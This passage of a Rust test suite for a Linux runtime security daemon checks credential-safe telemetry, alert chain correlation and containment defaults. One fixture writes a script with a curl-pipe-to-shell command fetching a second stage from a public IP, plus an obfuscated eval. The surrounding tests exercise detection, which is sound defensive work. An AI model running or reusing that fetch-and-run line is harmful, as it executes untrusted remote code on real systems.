                 "args":[{{"path_arg":{{"path":"{}"}}}},{{"int_arg":493}}]}}}}"#,
            f.display()
        ));
        d.flush_telemetry();
        let recs = telemetry_lines(&d);
        assert_eq!(recs.len(), 1);
        assert_eq!(recs[0]["verdict"], "chmod_x");
        assert_eq!(recs[0]["kind"], "file_chmod");
        // Magic bytes, not the (absent) extension.
        assert_eq!(recs[0]["shape"], "elf");
    }

    /// Body capture is opt-in, capped, and inherits the credential refusal that
    /// stops `evidence.rs` staging a key for an AI. A path that looks like key
    /// material is never read, whatever the config says.
    #[test]
    fn body_capture_is_opt_in_and_never_reads_a_credential() {
        let dir = tempfile::tempdir().unwrap();
        let ssh = dir.path().join(".ssh");
        std::fs::create_dir_all(&ssh).unwrap();
        let key = ssh.join("id_ed25519");
        std::fs::write(&key, b"-----BEGIN OPENSSH PRIVATE KEY-----\n").unwrap();
        let script = dir.path().join("setup.sh");
        std::fs::write(&script, b"#!/bin/sh\necho hi\n").unwrap();
        let big = dir.path().join("big.sh");
        std::fs::write(&big, vec![b'x'; 4096]).unwrap();

        let mut d = telemetry_daemon(dir.path(), |t| {
            t.file = true;
            t.capture_body = true;
            t.capture_body_max_bytes = 1024;
            t.create_window_secs = 0;
        });
        let hook = |p: &Path| {
            format!(
                r#"{{"process_kprobe":{{"process":{{"exec_id":"b1","pid":1,"binary":"/usr/bin/sh"}},
                     "function_name":"security_file_post_open",
                     "policy_name":"moat-telemetry-file-exec-shape",
                     "args":[{{"file_arg":{{"path":"{}"}}}},{{"int_arg":2}}]}}}}"#,
                p.display()
            )
        };
        for p in [&script, &key, &big] {
            d.handle_line(&hook(p));
        }
        d.flush_telemetry();
        let recs = telemetry_lines(&d);
        assert_eq!(recs.len(), 3, "all three are recorded");
        assert_eq!(recs[0]["body"], "#!/bin/sh\necho hi\n", "the script's body");
        assert!(
            recs[1].get("body").is_none(),
            "a private key's body must never be captured: {}",
            recs[1]
        );
        assert!(recs[2].get("body").is_none(), "over the cap");

        // …and a staged artefact's body is refused even though its path looks
        // like an ordinary script. moat-ship blanks the PATH wherever it
        // appears, but it cannot recognise a body, so the refusal is here.
        std::fs::create_dir_all(&d.cfg.analysis.bundle_dir).unwrap();
        let staged = d.cfg.analysis.bundle_dir.join("actor.setup.sh.suspect");
        std::fs::write(&staged, b"#!/bin/sh\nexfil\n").unwrap();
        d.handle_line(&hook(&staged));
        d.flush_telemetry();
        let recs = telemetry_lines(&d);
        assert_eq!(recs.len(), 4);
        assert!(
            recs[3].get("body").is_none(),
            "staged evidence body reached telemetry: {}",
            recs[3]
        );
        assert!(!std::fs::read_to_string(d.cfg.paths.telemetry())
            .unwrap()
            .contains("exfil"));
        // The key is still described — withheld is not hidden.
        assert!(recs[1]["sha256"].is_string());
        let all = std::fs::read_to_string(d.cfg.paths.telemetry()).unwrap();
        assert!(!all.contains("BEGIN OPENSSH PRIVATE KEY"), "key material reached the file");
    }

    #[test]
    fn the_process_class_records_exec_and_exit_without_the_parent_block() {
        let dir = tempfile::tempdir().unwrap();
        let mut d = telemetry_daemon(dir.path(), |t| t.process = true);
        d.handle_line(
            r#"{"process_exec":{"process":{"exec_id":"p1","pid":41233,"uid":1000,
                 "binary":"/usr/bin/node","arguments":"setup.mjs","cwd":"/home/dan/p",
                 "start_time":"2026-09-04T10:00:00.000000000Z","parent_exec_id":"p0"},
                 "parent":{"exec_id":"p0","pid":41230,"binary":"/usr/bin/sh","arguments":"-c x"}},
                 "time":"2026-09-04T10:00:00.100000000Z"}"#,
        );
        d.handle_line(
            r#"{"process_exit":{"process":{"exec_id":"p1","pid":41233,"binary":"/usr/bin/node"},
                 "status":0},"time":"2026-09-04T10:00:01.000000000Z"}"#,
        );
        d.flush_telemetry();
        let recs = telemetry_lines(&d);
        assert_eq!(recs.len(), 2);
        assert_eq!(recs[0]["kind"], "exec");
        assert_eq!(recs[0]["parent_exec_id"], "p0");
        assert!(recs[0].get("parent").is_none(), "the join halves the bytes");
        assert_eq!(recs[1]["kind"], "exit");
        assert_eq!(recs[1]["exec_id"], "p1");
        assert_eq!(d.telemetry_written, 2);
    }

    /// Design 2b/3a end to end, through the real event path.
    ///
    /// The shipped sample log is one `npm install` whose postinstall script
    /// reads an SSH key and a cloud credential, opens a reverse shell, talks to
    /// a host outside the registry allowlist, and ends up in ptrace and setuid.
    /// Before this stage those were eight separate alerts a person had to
    /// assemble in their head. They are one story under one process.
    #[test]
    fn the_sample_installs_alerts_correlate_into_one_chain() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let text = std::fs::read_to_string(&d.cfg.paths.tetragon_log).unwrap();
        for line in text.lines() {
            d.handle_line(line);
        }
        let alerts = d.store.load();
        let chained: Vec<&Alert> = alerts.iter().filter(|a| a.chain.is_some()).collect();
        assert!(chained.len() >= 4, "expected one chain across the install, got {}", chained.len());

        // Every member carries the same chain, so a reader that opened any one
        // of them can draw the whole story without a second lookup.
        let c = chained[0].chain.clone().unwrap();
        for a in &chained {
            assert_eq!(a.chain.as_ref().unwrap().id, c.id, "{} is in a different chain", a.id);
        }

        // The subject is the install, not whichever process happened to trip
        // the last rule.
        assert_eq!(c.ancestor.exe, "/usr/bin/npm");
        assert!(c.families.contains(&"cred".to_string()));
        assert!(c.families.contains(&"net".to_string()));

        // Higher than any member is the whole point, and it is written down.
        assert_eq!(c.severity, "critical");
        assert!(
            c.severity_reason.contains("credential") || c.severity_reason.starts_with("stays"),
            "escalation must justify itself: {}",
            c.severity_reason
        );
        assert!(c.summary.contains("under npm"), "{}", c.summary);

        // Steps are in time order, and each one names an alert that exists.
        let ids: std::collections::HashSet<&str> = alerts.iter().map(|a| a.id.as_str()).collect();
        let mut prev = String::new();
        for s in &c.steps {
            assert!(ids.contains(s.alert.as_str()), "step names a missing alert {}", s.alert);
            assert!(s.alert > prev, "steps out of order at {}", s.alert);
            prev = s.alert.clone();
        }

        // A member's own severity is never rewritten by the chain: it is still
        // the right answer about the single event it describes.
        let low = alerts.iter().find(|a| a.rule == "moat-pkg-subtree-interpreter-spawn").unwrap();
        assert_eq!(low.severity, "low", "the chain must not rewrite member severities");
        assert_eq!(low.chain.as_ref().unwrap().severity, "critical");

        // And the daemon reports it.
        let st = d.status();
        assert_eq!(st["chains_formed"], 1);
        assert_eq!(st["chains_open"], 1);
    }

    /// A chain over `ids`, anchored on the first, as the correlator would
    /// hand it to `publish_chain` after `ids.len()` observations.
    fn chain_of_members(ids: &[String], severity: &str) -> chain::Chain {
        let steps: Vec<chain::Step> = ids
            .iter()
            .take(chain::MAX_STEPS)
            .map(|m| chain::Step {
                alert: m.clone(),
                ts: "2026-09-10T10:00:00Z".into(),
                family: "cred".into(),
                rule: "moat-cred-registry-token-read".into(),
                severity: "medium".into(),
                title: "Registry token read by an unexpected program".into(),
                pid: 41233,
                exe: "/usr/bin/node".into(),
                role: "trigger".into(),
            })
            .collect();
        chain::Chain {
            v: 1,
            id: ids[0].clone(),
            ancestor: crate::alert::Ancestor::new(41201, "/usr/bin/makepkg".into()),
            families: vec!["cred".into(), "net".into()],
            severity: severity.into(),
            severity_base: "medium".into(),
            severity_reason: "medium -> high: a credential was read and the same process tree then connected out".into(),
            first_ts: "2026-09-10T10:00:00Z".into(),
            last_ts: "2026-09-10T10:00:01Z".into(),
            span_secs: 1,
            steps,
            steps_total: ids.len(),
            truncated: ids.len() > chain::MAX_STEPS,
            members: ids.to_vec(),
            triggers_total: ids.len(),
            summary: "4 things happened in 1 second under makepkg".into(),
        }
    }

    /// The store's largest known defect, measured. Every growth of a chain
    /// used to append the WHOLE chain to EVERY member, so a chain of N steps
    /// wrote O(N^2) chain copies: the 488-step `makepkg` chain of 2026-09-10
    /// wrote ~48 MB on its final growth alone and rotated the store ten times
    /// in eleven minutes.
    ///
    /// The budget asserted here is the design: one chain record per growth,
    /// on the anchor, plus one small line per member, once. And the reason the
    /// naive fix was reverted is asserted too: after the last growth every
    /// member -- the one that joined first most of all -- sees all N siblings,
    /// on the fold the daemon holds and on one rebuilt from disk.
    #[test]
    fn a_chain_growth_writes_the_chain_once_not_once_per_member() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        // Unbounded, so rotation cannot hide what was written: under the old
        // loop this chain wrote past 20 MB many times over.
        d.store = AlertStore::open(
            &cfg.paths.alerts(),
            &cfg.paths.alerts_rotated(),
            u64::MAX,
            u64::MAX,
            usize::MAX,
            &cfg.group,
        )
        .unwrap();
        const N: usize = 488;
        let ids: Vec<String> = (0..N).map(|i| format!("01MAKEPKG{:017}", i)).collect();
        for id in &ids {
            let mut a = crate::alert::tests_support::demo_alert(id);
            a.severity = "medium".into();
            a.surface = "timeline".into();
            d.store.append_alert(&a).unwrap();
        }
        let path = d.store.path().to_path_buf();
        let size = || std::fs::metadata(&path).unwrap().len();
        let before = size();

        let mut chain_bytes = 0u64;
        let mut unique = 0u64;
        for k in 1..=N {
            let c = chain_of_members(&ids[..k], "high");
            let value = serde_json::to_value(&c).unwrap();
            unique = serde_json::to_string(&c).unwrap().len() as u64;
            chain_bytes += serde_json::to_string(&UpdateLine::new(&c.id).set("chain", value.clone())).unwrap().len() as u64 + 1;
            let triggers: std::collections::HashSet<&str> = c.steps.iter().map(|s| s.alert.as_str()).collect();
            d.write_chain(&c, value, true, &triggers);
        }
        let appended = size() - before;
        eprintln!(
            "CHAIN WRITE: {} growths to {} members appended {} bytes; the final chain is {} bytes; \
             one copy per growth would be {} bytes",
            N, N, appended, unique, chain_bytes
        );
        // One chain record per growth plus one short line per member: the
        // members' lines are `{"v":1,"id":<26>,"update":{"chain_id":<26>,"surface":"alerts"}}`.
        assert!(
            appended <= chain_bytes + (N as u64) * 128,
            "appended {} bytes against a budget of {} + {}: the chain is being written per member",
            appended,
            chain_bytes,
            N * 128
        );

        // The invariant every reader relies on, on the daemon's own fold.
        for id in &ids {
            let a = d.store.find(id).unwrap();
            let c = a.chain.as_ref().unwrap_or_else(|| panic!("{} has no chain", id));
            assert_eq!(c.member_ids().len(), N, "{} holds an earlier snapshot", id);
            assert_eq!(c.id, ids[0]);
        }
        // ... and on a fold rebuilt from disk by another reader.
        let fresh = AlertStore::open(
            &cfg.paths.alerts(),
            &cfg.paths.alerts_rotated(),
            u64::MAX,
            u64::MAX,
            usize::MAX,
            "moat",
        )
        .unwrap();
        for id in &ids {
            let c = fresh.find(id).unwrap().chain.expect("chain on refold");
            assert_eq!(c.member_ids().len(), N, "{} lost siblings on refold", id);
        }
        // A growth that adds nobody and moves nothing writes one line.
        let c = chain_of_members(&ids, "high");
        let triggers: std::collections::HashSet<&str> = c.steps.iter().map(|s| s.alert.as_str()).collect();
        let lines = std::fs::read_to_string(&path).unwrap().lines().count();
        d.write_chain(&c, serde_json::to_value(&c).unwrap(), true, &triggers);
        assert_eq!(std::fs::read_to_string(&path).unwrap().lines().count(), lines + 1);
    }

    /// The trigger members are restamped onto the badge the moment the chain
    /// reaches `high`, once, not on every growth after -- and a member that
    /// joins after that is stamped when it joins.
    #[test]
    fn a_chain_reaching_high_restamps_its_triggers_once() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let ids: Vec<String> = (0..4).map(|i| format!("01SURFACE{:017}", i)).collect();
        for id in &ids {
            let mut a = crate::alert::tests_support::demo_alert(id);
            a.severity = "medium".into();
            a.surface = "timeline".into();
            d.store.append_alert(&a).unwrap();
        }
        let path = d.store.path().to_path_buf();
        let lines = || std::fs::read_to_string(&path).unwrap().lines().count();
        let publish = |d: &mut Daemon, k: usize, sev: &str| {
            let c = chain_of_members(&ids[..k], sev);
            let raise = crate::alert::severity_rank(sev) >= crate::alert::severity_rank("high");
            let triggers: std::collections::HashSet<&str> = c.steps.iter().map(|s| s.alert.as_str()).collect();
            d.write_chain(&c, serde_json::to_value(&c).unwrap(), raise, &triggers);
        };
        publish(&mut d, 2, "medium");
        assert_eq!(d.store.find(&ids[1]).unwrap().surface, "timeline");
        let n = lines();
        publish(&mut d, 3, "high");
        // Anchor (chain + surface), member 1 (surface), member 2 (chain_id + surface).
        assert_eq!(lines(), n + 3);
        for id in &ids[..3] {
            assert_eq!(d.store.find(id).unwrap().surface, "alerts", "{}", id);
        }
        let n = lines();
        publish(&mut d, 4, "high");
        // Anchor, and the newcomer. Nobody else is touched.
        assert_eq!(lines(), n + 2);
        assert_eq!(d.store.find(&ids[3]).unwrap().surface, "alerts");
        assert_eq!(d.store.find(&ids[3]).unwrap().chain.unwrap().member_ids().len(), 4);
    }

    /// Regression for the 2026-09-04 20:41 miss, driven through `emit` because
    /// the fault was in `note_chain`'s mapping and not in the correlator: a
    /// `chain.rs` unit test passed throughout.
    ///
    /// A simulated npm C2 package rewrote `.git/config` (persist, high,
    /// first_seen) and read a project token (cred, medium, rare) from one pid
    /// one second apart. Nothing correlated. `note_chain` was passing
    /// `silenced: alert.surface != "alerts"`, and `scoring::surface_for` routes
    /// on severity alone — so every medium and low was quietly a context step
    /// and the documented "at least one member at medium or worse" had become
    /// "at least two members at high or worse".
    #[test]
    fn a_medium_alert_is_a_chain_trigger_not_context() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        // One `node` under a bash whose own parent the daemon never saw: the
        // one-element ancestry of the real records.
        // Neither path may exist: a `high` alert takes an incident snapshot,
        // which opens and hashes both the exe and the file it names. See
        // `no_test_fixture_names_a_path_that_exists_on_this_machine`.
        let lab = "/tmp/moat-chain-regression-no-such-lab";
        let proc = |exec_id: &str, pid: u32, exe: &str| ProcInfo {
            exec_id: exec_id.into(),
            pid,
            uid: 1000,
            exe: exe.into(),
            args: String::new(),
            cwd: lab.into(),
            start_time: util::now_rfc3339(),
            parent_exec_id: None,
            exited_at: None,
            exit_signal: None,
            exe_note: None,
            in_container: None,
            sid: None,
            tty: None,
            ..Default::default()
        };
        let node = proc("e-node", 1_876_167, "/home/dan/.no-such-mise/node/26.5.0/bin/node");
        let bash = proc("e-bash", 581_833, "/usr/bin/bash");

        let finding = |rule: &str, family: &str, severity: &str, path: String| {
            let mut f = Finding::new(rule, crate::policy::PolicyMeta::fallback(rule), node.clone());
            f.meta.family = family.into();
            f.meta.severity = severity.into();
            f.hook = "file_post_open".into();
            f.hook_detail = Some("write".into());
            f.ancestry = vec![bash.clone()];
            f.file = Some(crate::alert::FileRef { path, sha256: None });
            f
        };

        let a = d
            .emit(finding(
                "moat-persist-git-config-write",
                "persist",
                "high",
                format!("{}/.git/config", lab),
            ))
            .expect("the persist write must raise an alert");
        let b = d
            .emit(finding(
                "moat-cred-project-token-read",
                "cred",
                "medium",
                format!("{}/.env", lab),
            ))
            .expect("the token read must raise an alert");

        let alerts = d.store.load();
        let by_id = |id: &str| alerts.iter().find(|x| x.id == id).unwrap().clone();
        let (pa, ca) = (by_id(&a), by_id(&b));

        // The shape the live daemon actually recorded, so this test fails if
        // the routing that caused the bug ever changes meaning.
        assert_eq!(pa.severity, "high");
        assert_eq!(pa.surface, "alerts");
        assert_eq!(ca.severity, "medium");
        // `surface_for` routed this medium to the timeline, and then the chain
        // reached `high` and restamped its trigger members. That is the whole
        // point: a correlated sequence has to be able to reach the badge even
        // when each half is unremarkable on its own.
        assert_eq!(ca.surface, "alerts", "a high chain raises its trigger members");
        assert!(ca.suppressed_by.is_none(), "nobody allowlisted this");

        // Both alerts carry the sequence, and both count as triggers.
        let chain = pa.chain.clone().expect("the two alerts must correlate");
        assert_eq!(ca.chain.as_ref().map(|c| c.id.as_str()), Some(chain.id.as_str()));
        assert_eq!(chain.steps.len(), 2);
        assert!(
            chain.steps.iter().all(|s| s.is_trigger()),
            "a timeline alert is weak, not allowed: {:?}",
            chain.steps.iter().map(|s| s.role.clone()).collect::<Vec<_>>()
        );
        assert_eq!(chain.families, vec!["persist", "cred"]);
        assert_eq!(chain.ancestor.pid, 1_876_167);
        assert_eq!(d.status()["chains_formed"], 1);

        // The member's own SEVERITY is untouched: the chain is the escalation,
        // and `medium` is still the right answer about one read. What the chain
        // does change is where the member is shown -- a sequence worth
        // interrupting for cannot be one nobody is shown.
        assert_eq!(by_id(&b).severity, "medium");
        assert_eq!(by_id(&b).surface, "alerts");
        assert!(by_id(&b).suppressed_by.is_none());
    }

    /// A high chain reads the files it implicated, and the findings land where
    /// they help — without moving a single severity.
    ///
    /// The trigger is deliberately narrow: this is the ONLY path in the daemon
    /// that opens a file to look at its contents. If a future change makes
    /// something scan on write, on exec or on a timer, that is an anti-virus,
    /// and it was explicitly rejected for this product.
    #[test]
    fn a_high_chain_reads_what_it_implicated_and_changes_no_severity() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let lab = dir.path().join("lab");
        std::fs::create_dir_all(lab.join(".config/autostart")).unwrap();

        // The dropper: a real ELF, so the parser is exercised on something a
        // linker produced rather than on a fixture.
        let dropper = lab.join(".fontconfig-helper");
        std::fs::copy("/bin/sh", &dropper).unwrap();
        // The persistence artefact: a script carrying the vocabulary.
        let unit = lab.join(".config/autostart/update.desktop");
        std::fs::write(
            &unit,
            b"#!/bin/sh\n# updater\ncurl -sL http://45.9.148.99/stage2 | sh\neval(atob('cm0='))\n",
        )
        .unwrap();
        // The credential the same tree read. It must never be opened.
        let secret = lab.join(".env");
        std::fs::write(&secret, b"AWS_SECRET_ACCESS_KEY=hunter2\n").unwrap();

        let proc = |exec_id: &str, pid: u32, exe: &str| ProcInfo {
            exec_id: exec_id.into(),
            pid,
            uid: 1000,
            exe: exe.into(),
            args: String::new(),
            cwd: lab.display().to_string(),
            start_time: util::now_rfc3339(),
            parent_exec_id: None,
            exited_at: None,
            exit_signal: None,
            exe_note: None,
            in_container: None,
            sid: None,
            tty: None,
            ..Default::default()
        };
        let actor = proc("e-drop", 4242, &dropper.display().to_string());
        let parent = proc("e-bash", 4241, "/usr/bin/bash");
        let finding = |rule: &str, family: &str, severity: &str, path: String| {
            let mut f = Finding::new(rule, crate::policy::PolicyMeta::fallback(rule), actor.clone());
            f.meta.family = family.into();
            f.meta.severity = severity.into();
            f.hook = "file_post_open".into();
            f.hook_detail = Some("write".into());
            f.ancestry = vec![parent.clone()];
            f.file = Some(crate::alert::FileRef { path, sha256: None });
            f
        };

        let persist = d
            .emit(finding(
                "moat-persist-autostart-write",
                "persist",
                "high",
                unit.display().to_string(),
            ))
            .unwrap();
        let cred = d
            .emit(finding(
                "moat-cred-project-token-read",
                "cred",
                "medium",
                secret.display().to_string(),
            ))
            .unwrap();

        let alerts = d.store.load();
        let by_id = |id: &str| alerts.iter().find(|x| x.id == id).unwrap().clone();
        let pa = by_id(&persist);
        assert!(pa.chain.is_some(), "the two alerts must correlate first");

        // --- the actor: a real ELF, read the way ldd and nm read it.
        let elf = pa
            .content
            .iter()
            .find(|c| c.role == "actor")
            .expect("the binary that acted was analysed");
        assert_eq!(elf.kind, "elf", "type comes from magic bytes");
        assert_eq!(elf.sha256.len(), 64);
        let e = elf.elf.as_ref().expect("ELF details");
        assert_eq!(e.linkage, "dynamic");
        assert!(e.needed.iter().any(|n| n.starts_with("libc.so")), "{:?}", e.needed);
        assert!(e.sections.iter().any(|s| s.name == ".text"));

        // --- the target: the vocabulary, the C2 address, and its range.
        let script = pa
            .content
            .iter()
            .find(|c| c.role == "target")
            .expect("the file it touched was analysed");
        assert_eq!(script.kind, "script");
        assert_eq!(script.script.as_ref().unwrap().interpreter, "/bin/sh");
        let names: Vec<&str> = script.markers.iter().map(|m| m.name.as_str()).collect();
        assert!(names.contains(&"exec:curl-pipe-shell"), "{:?}", names);
        assert!(
            script.hosts.iter().any(|h| h.value == "45.9.148.99" && h.scope == "public"),
            "{:?}",
            script.hosts
        );

        // --- the credential is named and never opened. `is_secret_path` is the
        // authority, and it holds on this path even though the rule that
        // matched it is in the family whose target IS the secret.
        let ca = by_id(&cred);
        let refused = ca
            .content
            .iter()
            .find(|c| c.role == "target")
            .expect("the credential is still listed");
        assert!(
            refused.skipped.as_deref().unwrap_or("").contains("credential"),
            "{:?}",
            refused.skipped
        );
        assert!(refused.sha256.is_empty(), "a refused file is not even hashed");
        assert!(refused.strings.is_empty());

        // --- findings are evidence. They are on the alert's evidence list, and
        // in the bundle, and they moved nothing.
        assert_eq!(pa.severity, "high", "content analysis must not move a severity");
        assert_eq!(ca.severity, "medium");
        assert_eq!(pa.severity_base, by_id(&persist).severity_base);
        assert!(
            pa.explain.evidence.iter().any(|l| l.contains("45.9.148.99 [public]")),
            "{:?}",
            pa.explain.evidence
        );
        let md = d.write_bundle(&persist).unwrap();
        let body = std::fs::read_to_string(&md).unwrap();
        assert!(body.contains("## What is inside those files"));
        assert!(body.contains("45.9.148.99"));

        // --- and the budget is spent, counted, and visible.
        assert!(d.status()["content"]["used"].as_u64().unwrap() >= 2);
    }

    /// What must be pushed back into the kernel after a restart.
    ///
    /// `tetra tp set-mode` changes a live policy and that change dies with the
    /// sensor. Restoring the armed set into memory only -- which is what the
    /// daemon did until 2026-09-04 -- meant that after any tetragon restart the
    /// rules reverted to `monitor` in the kernel while `status` and the panel
    /// still said ARMED. Believing a rule is enforcing when it is not is worse
    /// than knowing it is off.
    #[test]
    fn the_armed_set_is_pushed_back_into_the_kernel_after_a_restart() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        assert!(
            d.enforcement_to_apply().is_empty(),
            "a monitor daemon with nothing armed asks the kernel for nothing"
        );

        let rule = d.policies.names().first().cloned().expect("testdata policies");
        d.enforcing_rules.insert(rule.clone());
        assert_eq!(
            d.enforcement_to_apply(),
            vec![rule.clone()],
            "one armed rule is one policy to re-arm, not all of them"
        );

        // Daemon-wide enforce means every policy, not just the named ones.
        d.mode = "enforce".into();
        assert_eq!(d.enforcement_to_apply().len(), d.policies.names().len());
    }

    /// The kill decision must not act until it is asked to, and must not act
    /// twice on one chain.
    ///
    /// A design review on 2026-09-05 ran the first version of these rules
    /// against this machine's own records: they would have killed the user's
    /// build four times that day, thirteen processes at a time. `log` is the
    /// default because rules for an action with no undo have to be judged
    /// against real traffic before they are allowed to act.
    #[test]
    fn killing_is_off_until_asked_and_decided_once_per_chain() {
        assert_eq!(Config::default().contain.kill, "log", "never `kill` by default");
        assert!(
            !Config::default().contain.enabled,
            "and containment itself is off too"
        );

        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.contain.kill = "off".into();

        // In `off` no chain is ever considered, so nothing is recorded about it.
        let c = crate::chain::Chain {
            v: 1,
            id: "01CHAIN".into(),
            ancestor: crate::alert::Ancestor::new(5000, "/usr/bin/makepkg".into()),
            families: vec!["exec".into(), "net".into()],
            severity: "high".into(),
            severity_base: "high".into(),
            severity_reason: "r".into(),
            first_ts: util::now_rfc3339(),
            last_ts: util::now_rfc3339(),
            span_secs: 1,
            steps: vec![],
            steps_total: 0,
            truncated: false,
            members: Vec::new(),
            triggers_total: 0,
            summary: "s".into(),
        };
        d.maybe_kill_tree(&c);
        assert!(d.killed_chains.is_empty());

        // In `log` a chain with no usable targets is still not recorded, so a
        // later growth of the same chain can still be judged.
        d.cfg.contain.kill = "log".into();
        d.maybe_kill_tree(&c);
        assert!(d.killed_chains.is_empty(), "nothing to decide is not a decision");
    }

    /// Containment is the only thing moat does on its own judgement rather than
    /// on a rule the user armed, so it stays off until it is asked for --
    /// including when rules ARE armed and the daemon is enforcing.
    #[test]
    fn containment_never_happens_unless_it_was_turned_on() {
        assert!(
            !Config::default().contain.enabled,
            "the default must be off; a security default that surprises is a bug"
        );

        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.mode = "enforce".into();
        d.cfg.thresholds.dedupe_secs = 0;
        // A tetra that would fail loudly if it were ever run.
        d.cfg.paths.tetra = dir.path().join("no-such-tetra");
        let proc = |exec_id: &str, pid: u32, exe: &str| ProcInfo {
            exec_id: exec_id.into(),
            pid,
            uid: 1000,
            exe: exe.into(),
            args: String::new(),
            cwd: "/tmp/moat-contain-no-such-lab".into(),
            start_time: util::now_rfc3339(),
            parent_exec_id: None,
            exited_at: None,
            exit_signal: None,
            exe_note: None,
            in_container: None,
            sid: None,
            tty: None,
            ..Default::default()
        };
        let actor = proc("e-imp", 7100, "/tmp/no-such-lab/implant");
        let root = proc("e-mk", 7000, "/usr/bin/no-such-makepkg");
        let mut mk = |rule: &str, family: &str, sev: &str, ip: Option<&str>| {
            let mut f = Finding::new(rule, crate::policy::PolicyMeta::fallback(rule), actor.clone());
            f.meta.family = family.into();
            f.meta.severity = sev.into();
            f.ancestry = vec![root.clone()];
            if let Some(ip) = ip {
                f.net = Some(crate::alert::NetRef {
                    dst_ip: ip.into(),
                    dst_port: 4873,
                    domain: None,
                    domain_age_secs: None,
                    domain_cname: None,
                domain_queried_by: None,
            });
            } else {
                f.hook = "file_post_open".into();
                f.file = Some(crate::alert::FileRef {
                    path: "/tmp/no-such-lab/dropped".into(),
                    sha256: None,
                });
            }
            d.emit(f)
        };
        mk("moat-persist-git-config-write", "persist", "high", None);
        mk("moat-x-pkg-egress", "net", "medium", Some("192.168.44.122"));

        assert!(
            d.contain.live().is_empty(),
            "a high chain must not contain anything while containment is off"
        );
    }

    /// A FOLD IS STILL A THING THAT HAPPENED.
    ///
    /// This is the property `dedupe_key`'s pid was protecting, now protected
    /// directly instead. Until 2026-09-07 `emit` returned on a fold before
    /// `note_chain`, so a second process tree doing the same thing folded into
    /// the first row AND vanished from correlation -- the 2026-09-06 exfil
    /// miss. The key was narrowed to compensate, which stopped it collapsing
    /// anything from repeated short-lived processes (kubectl: 69 rows, 69 pids,
    /// one destination).
    ///
    /// So: a repeat is one row, and it still reaches the chain.
    ///
    /// (Two different TREES stay two rows -- see
    /// `two_trees_to_one_host_stay_two_alerts`. Merging those was the trap.)
    #[test]
    fn a_folded_event_still_reaches_chain_correlation() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 600;

        let mkproc = |exec_id: &str, pid: u32| ProcInfo {
            exec_id: exec_id.into(),
            pid,
            uid: 1000,
            exe: "/usr/bin/kubectl".into(),
            args: "get pods".into(),
            cwd: "/home/dan".into(),
            start_time: util::now_rfc3339(),
            parent_exec_id: None,
            exited_at: None,
            exit_signal: None,
            exe_note: None,
            in_container: None,
            sid: None,
            tty: None,
            ..Default::default()
        };
        let root = mkproc("e-root", 7000);
        let mut mk = |exec_id: &str, pid: u32| {
            let mut f = Finding::new(
                "moat-net-first-contact",
                crate::policy::PolicyMeta::fallback("moat-net-first-contact"),
                mkproc(exec_id, pid),
            );
            f.meta.family = "net".into();
            f.meta.severity = "low".into();
            f.ancestry = vec![root.clone()];
            f.net = Some(crate::alert::NetRef {
                dst_ip: "162.209.114.112".into(),
                dst_port: 443,
                domain: None,
                domain_age_secs: None,
                domain_cname: None,
                domain_queried_by: None,
            });
            d.emit(f)
        };

        // ONE process hitting one destination twice: a genuine fold.
        let first = mk("e-a", 7101).expect("an id");
        let second = mk("e-a", 7101).expect("an id");

        assert_eq!(first, second, "one process, one destination: one row");

        let rows = d.store.load();
        let bodies: Vec<_> = rows.iter().filter(|a| a.rule == "moat-net-first-contact").collect();
        assert_eq!(bodies.len(), 1, "one alert on record, not two: {:?}", bodies.len());

        // And the fold was still correlated: the chain saw both, so the count
        // moved past one. This is what the pid used to buy, bought properly.
        assert!(
            bodies[0].count.unwrap_or(1) >= 2,
            "the folded event was recorded as a repeat, not dropped"
        );
    }

    /// Two process trees doing the same thing stay two alerts.
    ///
    /// This pins the 2026-09-06 exfil miss against a fix that looks right and
    /// is not. On 2026-09-07 the pid was briefly taken out of `dedupe_key`, on
    /// the argument that a fold now reaches `note_chain` -- true, and not
    /// enough. Two more things hang off a fold and neither was in that
    /// argument: `emit` captures an incident snapshot only when nothing folded,
    /// and `chain::note` records one step per ALERT ID. So the second tree
    /// would have had no row, no snapshot and no step: nearly invisible, which
    /// is the miss again.
    #[test]
    fn two_trees_to_one_host_stay_two_alerts() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 600;

        let mkproc = |exec_id: &str, pid: u32| ProcInfo {
            exec_id: exec_id.into(),
            pid,
            uid: 1000,
            exe: "/usr/bin/python3".into(),
            args: "x.py".into(),
            cwd: "/home/dan".into(),
            start_time: util::now_rfc3339(),
            parent_exec_id: None,
            exited_at: None,
            exit_signal: None,
            exe_note: None,
            in_container: None,
            sid: None,
            tty: None,
            ..Default::default()
        };
        let mut mk = |exec_id: &str, pid: u32| {
            let mut f = Finding::new(
                "moat-net-first-contact",
                crate::policy::PolicyMeta::fallback("moat-net-first-contact"),
                mkproc(exec_id, pid),
            );
            f.meta.family = "net".into();
            f.meta.severity = "low".into();
            f.net = Some(crate::alert::NetRef {
                dst_ip: "192.168.44.122".into(),
                dst_port: 4873,
                domain: None,
                domain_age_secs: None,
                domain_cname: None,
                domain_queried_by: None,
            });
            d.emit(f)
        };

        // The benign run and the exfil run: same program, same C2, different
        // trees.
        let benign = mk("e-benign", 8001).expect("an id");
        let exfil = mk("e-exfil", 8002).expect("an id");

        assert_ne!(
            benign, exfil,
            "a second tree is a second event -- it needs its own row, snapshot and step"
        );
        let rows = d.store.load();
        assert_eq!(
            rows.iter().filter(|a| a.rule == "moat-net-first-contact").count(),
            2,
            "two alerts on record"
        );
    }

    /// A containment must not outlive the conclusion that justified it.
    ///
    /// 2026-09-07, live: `dockerd` pulling an image was contained at 13:50:21,
    /// and the SAME chain read `medium` at 13:51:17 -- a chain is re-evaluated
    /// every time a step joins it and can go down, as more steps turn "a
    /// sequence" into "one program doing its job". moat had withdrawn the
